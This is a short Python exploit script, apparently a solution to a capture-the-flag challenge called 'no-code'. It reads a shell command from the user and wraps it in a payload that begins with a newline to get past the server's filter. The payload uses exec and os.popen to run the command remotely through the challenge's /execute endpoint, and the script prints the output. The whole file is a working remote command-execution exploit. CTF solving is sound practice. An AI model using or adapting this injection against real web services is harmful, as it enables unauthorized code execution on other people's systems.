import requests,json

cmd=input('Commmand: ')
payload=f"\nstr(exec(\"import os; result=os.popen(\'{cmd}\').read();\"))+result"
r=requests.post(
    "https://uoftctf-no-code.chals.io/execute",
    data={"code": payload}
)
# print(r.content.decode())
data=json.loads(r.content.decode())
print(data['output'][4:])